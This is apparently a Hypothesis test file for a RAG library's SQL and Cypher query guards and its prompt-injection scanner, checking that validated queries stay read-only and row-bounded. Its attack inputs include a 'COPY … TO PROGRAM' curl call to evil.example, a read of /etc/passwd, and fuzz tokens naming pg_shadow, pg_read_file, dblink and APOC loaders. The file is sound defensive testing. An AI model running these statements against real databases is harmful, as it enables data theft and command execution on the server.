"""Property-based tests for the query guards.

Why this file exists alongside the hand-written attack corpus in
``test_security_guards.py``: that corpus was written by the same mind as the
guards, and an audit found whole categories it had never considered — the
``*_to_xml*`` export family, backtick-quoted procedure names, Cypher smuggled
through a *function argument*, administrative ``SHOW`` commands. Each was obvious
in hindsight and invisible in advance, which is the signature of a blind spot
rather than an oversight.

Enumeration cannot fix that. Properties can, because they assert what must hold
for **every** input rather than for the inputs someone thought of:

* a validated statement never contains a write verb at any depth;
* a validated statement is always row-bounded;
* the guard terminates and either returns or raises ``GuardrailViolation`` — it
  never raises something the caller is not expecting, and never hangs;
* normalization is idempotent, so a payload cannot survive by being normalized
  into a different payload.

Hypothesis generates the adversarial input. The point is not the examples it
happens to find today — it is that the property is checked against inputs nobody
curated, including next year.
"""

from __future__ import annotations

import contextlib
import re

import pytest
import sqlglot
from hypothesis import HealthCheck, assume, given
from hypothesis import settings as hyp_settings
from hypothesis import strategies as st
from sqlglot import exp

from ragorc.core.errors import GuardrailViolation
from ragorc.core.settings import SecuritySettings
from ragorc.security.cypher_guard import CypherGuard
from ragorc.security.injection import InjectionScanner
from ragorc.security.sql_guard import SQLGuard

# Deadline disabled: sqlglot parsing of a pathological generated statement can
# exceed Hypothesis's default, and a slow parse is not the property under test.
PROFILE = hyp_settings(
    max_examples=250,
    deadline=None,
    suppress_health_check=[HealthCheck.too_slow, HealthCheck.filter_too_much],
)

#: Node types that must never appear in a validated tree, at any depth. Listed
#: independently of the guard's own ``_FORBIDDEN_NODES`` on purpose: a test that
#: imports the list it is checking asserts only that the guard agrees with itself.
_WRITE_NODES: tuple[type[exp.Expression], ...] = (
    exp.Insert,
    exp.Update,
    exp.Delete,
    exp.Drop,
    exp.Create,
    exp.Alter,
    exp.Merge,
    exp.TruncateTable,
    exp.Grant,
    exp.Copy,
    exp.Command,  # sqlglot's catch-all: COPY … TO PROGRAM, VACUUM, CALL, SET
)

#: Clauses that must never survive Cypher validation. There is no equivalent tree
#: to walk on this side — the guard returns rewritten text — so the scan stays
#: textual. It stays sound because each of these is a reserved write clause, not
#: something a read can legally use as a name.
_CYPHER_WRITE_CLAUSES = (
    "create",
    "merge",
    "delete",
    "detach",
    "remove",
    "set",
    "load csv",
    "foreach",
)

#: Quoted spans and comments, blanked before scanning validated SQL. A `;` inside
#: a string or a double-quoted identifier is a character in a name, not a
#: statement separator, and `SELECT 'a;b'` is a perfectly good read.
_SQL_QUOTED = re.compile(
    r"""
    '(?:[^'\\]|\\.)*'        # string literal
  | \$\$.*?\$\$                # dollar-quoted string
  | "(?:[^"]|"")*"            # quoted identifier
  | --[^\n]*                  # line comment
  | /\*.*?\*/                 # block comment
    """,
    re.VERBOSE | re.DOTALL,
)

#: Quoted spans and comments, blanked before scanning validated Cypher. Contents
#: of a string are data, not clauses.
_CYPHER_QUOTED = re.compile(
    r"""
    '(?:[^'\\]|\\.)*'
  | "(?:[^"\\]|\\.)*"
  | `(?:[^`]|``)*`
  | //[^\n]*
  | /\*.*?\*/
    """,
    re.VERBOSE | re.DOTALL,
)

#: Fragments assembled into candidate statements. Deliberately includes the
#: quoting, comment and casing tricks that defeated earlier versions of the
#: guards, so the generator explores that neighbourhood rather than only clean SQL.
_SQL_NOISE = st.sampled_from(
    [
        " ",
        "\t",
        "\n",
        "/**/",
        "/* c */",
        "--x\n",
        ";",
        "(",
        ")",
        "'",
        '"',
        "`",
        "\\",
        "*",
        "%",
        "$$",
        "​",
        "‮",
        "  ",
        "\r\n",
    ]
)
_SQL_TOKENS = st.sampled_from(
    [
        "SELECT",
        "select",
        "SeLeCt",
        "1",
        "*",
        "FROM",
        "customers",
        "orders",
        "pg_shadow",
        "information_schema.tables",
        "WHERE",
        "id",
        "=",
        "LIMIT",
        "10",
        "999999",
        "UNION",
        "ALL",
        "WITH",
        "x",
        "AS",
        "INSERT",
        "INTO",
        "DELETE",
        "UPDATE",
        "SET",
        "DROP",
        "TABLE",
        "COPY",
        "PROGRAM",
        "pg_read_file",
        "query_to_xml",
        "table_to_xml",
        "database_to_xml",
        "RETURNING",
        "INTO",
        "FOR",
        "UPDATE",
        "LATERAL",
        "JOIN",
        "ON",
        "CASE",
        "WHEN",
        "THEN",
        "END",
        "(SELECT",
        "1)",
        "pg_sleep",
        "dblink",
    ]
)

_CYPHER_TOKENS = st.sampled_from(
    [
        "MATCH",
        "match",
        "(n)",
        "(n:Entity)",
        "-[r]->",
        "-[r*]-",
        "-[r*1..3]-",
        "-[r*1..99]-",
        "RETURN",
        "n",
        "n.name",
        "count(*)",
        "collect(*)",
        "WHERE",
        "LIMIT",
        "10",
        "5000",
        "CALL",
        "db.labels()",
        "apoc.load.json('http://x/')",
        "`apoc.load.json`('http://x/')",
        "YIELD",
        "value",
        "DELETE",
        "DETACH",
        "CREATE",
        "MERGE",
        "SET",
        "REMOVE",
        "FOREACH",
        "LOAD",
        "CSV",
        "FROM",
        "SHOW",
        "USERS",
        "SETTINGS",
        "apoc.cypher.runFirstColumn('MATCH (n) DELETE n', {})",
        "UNION",
        "WITH",
        "AS",
        "x",
        "{",
        "}",
        ";",
        "//c\n",
        "'DELETE ME'",
        '" DELETE "',
        "`DELETE`",
    ]
)


def _statement(tokens: st.SearchStrategy[str]) -> st.SearchStrategy[str]:
    return st.lists(st.one_of(tokens, _SQL_NOISE), min_size=1, max_size=14).map(" ".join)


# ---------------------------------------------------------------------------
# The guards must be total: return, or raise GuardrailViolation. Nothing else.
# ---------------------------------------------------------------------------
@PROFILE
@given(_statement(_SQL_TOKENS))
def test_sql_guard_is_total(statement: str) -> None:
    """No input produces an unexpected exception type.

    This is the property that makes the guard safe to call on model output: a
    caller that handles ``GuardrailViolation`` has handled everything. An
    ``AttributeError`` from inside sqlglot would escape that handler and become a
    500 — or worse, be caught by a broad ``except`` upstream and treated as a
    *pass*.
    """
    guard = SQLGuard(SecuritySettings(), allowed_tables=["customers", "orders"], max_rows=100)
    # A rejection is a pass here: the property is that nothing *else* escapes.
    with contextlib.suppress(GuardrailViolation):
        guard.validate(statement)


@PROFILE
@given(_statement(_CYPHER_TOKENS))
def test_cypher_guard_is_total(statement: str) -> None:
    guard = CypherGuard(SecuritySettings(), max_rows=100, max_hops=3)
    with contextlib.suppress(GuardrailViolation):
        guard.validate(statement)


# ---------------------------------------------------------------------------
# Anything that validates must be a bounded read.
# ---------------------------------------------------------------------------
@PROFILE
@given(_statement(_SQL_TOKENS))
def test_validated_sql_contains_no_write_verb(statement: str) -> None:
    """The invariant the whole guard exists to hold.

    Checked on the *rewritten* SQL the guard hands back, since that is what
    executes — and checked by re-parsing it, not by scanning it for words.

    A word scan cannot distinguish a verb from a column that happens to share its
    name: sqlglot parses ``SELECT DELETE`` as ``Select(Column(delete))``, and so
    does Postgres, which answers `column "delete" does not exist`. Hypothesis
    found exactly that, as it earlier found ``SELECT copy``. Both are noise. The
    signal is the *shape* of the tree, so that is what this asserts, at every
    depth — which also catches a write buried in a CTE or a sub-select, where a
    verb list at the top level would not look.

    The text scan that remains asks the one question the tree cannot: does the
    statement that will be sent to the server still *begin* as a read, with no
    second statement smuggled in behind it? A parser differential can only turn
    into a write if Postgres sees a different leading verb than sqlglot did.
    """
    guard = SQLGuard(SecuritySettings(), allowed_tables=["customers", "orders"], max_rows=100)
    try:
        result = guard.validate(statement)
    except GuardrailViolation:
        return

    reparsed = sqlglot.parse(result.sql, read="postgres")
    assert len(reparsed) == 1, f"validated SQL is more than one statement: {result.sql!r}"
    for node in reparsed[0].walk():
        assert not isinstance(node, _WRITE_NODES), (
            f"validated SQL contains a {type(node).__name__} node: "
            f"{result.sql!r} (from {statement!r})"
        )

    scannable = _SQL_QUOTED.sub(" ", result.sql).lower().lstrip("( \t\n")
    assert scannable.startswith(("select", "with")), (
        f"validated SQL does not begin as a read: {result.sql!r}"
    )
    assert ";" not in scannable.rstrip().rstrip(";"), (
        f"validated SQL carries a statement separator: {result.sql!r}"
    )


@PROFILE
@given(_statement(_SQL_TOKENS))
def test_validated_sql_is_row_bounded(statement: str) -> None:
    """A validated statement always carries a LIMIT, and reports that it does.

    An unbounded scan is a denial of service against the database a RAG query
    shares with everything else, so "it was only a SELECT" is not sufficient.
    """
    guard = SQLGuard(SecuritySettings(), allowed_tables=["customers", "orders"], max_rows=100)
    try:
        result = guard.validate(statement)
    except GuardrailViolation:
        return
    assert result.has_limit, f"validated without a bound: {result.sql!r}"
    assert re.search(r"\blimit\b", result.sql, re.IGNORECASE), (
        f"has_limit is True but no LIMIT is present: {result.sql!r}"
    )


@PROFILE
@given(_statement(_CYPHER_TOKENS))
def test_validated_cypher_is_bounded_and_read_only(statement: str) -> None:
    guard = CypherGuard(SecuritySettings(), max_rows=100, max_hops=3)
    try:
        result = guard.validate(statement)
    except GuardrailViolation:
        return

    assert re.search(r"\blimit\s+\d+", result.cypher, re.IGNORECASE), (
        f"validated without a LIMIT: {result.cypher!r}"
    )
    # Quoted spans blanked, for the same reason as the SQL case. All three quote
    # styles, deliberately: Cypher strings may be single- or double-quoted and
    # identifiers may be backticked, so blanking only one style reports the
    # *contents* of a returned string as a write clause. Written out here rather
    # than imported from the guard — this is a second opinion, and a test that
    # shares the guard's regex cannot disagree with it about escaping.
    scannable = _CYPHER_QUOTED.sub(" ", result.cypher).lower()
    for verb in _CYPHER_WRITE_CLAUSES:
        # Word-bounded, not a substring test: `RETURN SETTINGS` contains "set" and
        # is a read. The guard gets this right — it bounds its own keyword scan the
        # same way — and a looser test here would have failed on the guard's
        # correct behaviour.
        assert not re.search(rf"\b{verb}\b", scannable), (
            f"validated Cypher contains {verb!r}: {result.cypher!r} (from {statement!r})"
        )
    # An unbounded hop pattern must never survive — asserted on `scannable`, not
    # on the raw output. A `-[r*]-` inside a string literal is *data*: the guard
    # is right to pass `RETURN ' -[r*]- '`, and asserting on raw text failed this
    # property on a query that traverses nothing. The blanked copy exists above
    # for exactly this reason.
    assert not re.search(r"\[[^\]]*\*\s*\]", scannable), (
        f"unbounded hop survived: {result.cypher!r}"
    )


# ---------------------------------------------------------------------------
# Legitimate queries must survive. A guard that rejects real work gets disabled.
# ---------------------------------------------------------------------------
@PROFILE
@given(
    column=st.sampled_from(["name", "country", "segment", "arr_usd", "*"]),
    table=st.sampled_from(["customers", "orders"]),
    limit=st.integers(min_value=1, max_value=50),
)
def test_ordinary_select_is_never_rejected(column: str, table: str, limit: int) -> None:
    """The availability half of the contract.

    The audit found `count(*)` rejected as an unbounded hop pattern — a guard that
    refuses ordinary aggregation is one an operator switches off, at which point
    it protects nothing. False positives are a security property, not a
    convenience.
    """
    guard = SQLGuard(SecuritySettings(), allowed_tables=["customers", "orders"], max_rows=100)
    guard.validate(f"SELECT {column} FROM {table} LIMIT {limit}")


@PROFILE
@given(
    aggregate=st.sampled_from(["count(*)", "count(n)", "collect(n.name)", "avg(n.degree)"]),
    label=st.sampled_from(["Entity", "Chunk", "Community"]),
)
def test_ordinary_aggregation_cypher_is_never_rejected(aggregate: str, label: str) -> None:
    guard = CypherGuard(SecuritySettings(), max_rows=100, max_hops=3)
    guard.validate(f"MATCH (n:{label}) RETURN {aggregate} AS value")


# ---------------------------------------------------------------------------
# Injection normalization must be idempotent.
# ---------------------------------------------------------------------------
@PROFILE
@given(st.text(max_size=400))
def test_injection_normalization_is_idempotent(text: str) -> None:
    """Normalizing twice must equal normalizing once.

    If it did not, a payload could survive by being normalized *into* a different
    payload — the scan would run on one string and the caller would use another,
    which is the parser/executor differential this whole layer exists to close.
    """
    scanner = InjectionScanner(SecuritySettings(injection_action="flag"))
    once = scanner.scan(text).clean_text
    twice = scanner.scan(once).clean_text
    assert once == twice


@PROFILE
@given(st.text(max_size=400))
def test_injection_scan_never_raises_in_flag_mode(text: str) -> None:
    """In ``flag`` mode the scanner reports and never rejects, for any input."""
    scanner = InjectionScanner(SecuritySettings(injection_action="flag"))
    result = scanner.scan(text)
    assert isinstance(result.risk, float)
    assert 0.0 <= result.risk <= 1.0


@PROFILE
@given(st.text(min_size=1, max_size=200))
def test_wrap_untrusted_cannot_be_escaped_by_any_payload(payload: str) -> None:
    """The load-bearing defence, asserted over arbitrary text.

    Structural isolation only works if content cannot terminate its own
    container, so exactly one closing tag may appear however the payload is
    constructed.
    """
    from ragorc.security.injection import wrap_untrusted

    assume("\x00" not in payload)
    wrapped = wrap_untrusted(payload, index=1)
    assert wrapped.count("</untrusted_document>") == 1


# ---------------------------------------------------------------------------
# What relaxing the two assertions must not have given up
# ---------------------------------------------------------------------------
@pytest.mark.parametrize(
    "statement",
    [
        "COPY orders TO PROGRAM 'curl https://evil.example'",
        "COPY orders FROM '/etc/passwd'",
        "COPY (SELECT * FROM orders) TO STDOUT",
    ],
)
def test_statement_level_copy_is_still_refused(statement: str) -> None:
    """Dropping ``copy`` from the word scan must not weaken the real control.

    A word scan cannot distinguish the statement from a column of the same name;
    the AST walk can. This pins that the actual exfiltration shapes are still
    refused, at the layer that can tell them apart.
    """
    guard = SQLGuard(SecuritySettings(), allowed_tables=["orders"], max_rows=100)
    with pytest.raises(GuardrailViolation):
        guard.validate(statement)


def test_a_column_named_copy_is_allowed() -> None:
    """The false positive the removal fixes, pinned so it cannot return."""
    guard = SQLGuard(SecuritySettings(), allowed_tables=["orders"], max_rows=100)
    assert guard.validate("SELECT copy FROM orders LIMIT 5").sql


def test_a_hop_pattern_inside_a_literal_is_data_not_a_traversal() -> None:
    """The other false positive: quoted text is not a query."""
    guard = CypherGuard(SecuritySettings(), max_rows=100, max_hops=3)
    assert guard.validate("MATCH (n) WHERE n.note = '-[r*]-' RETURN n.name").cypher
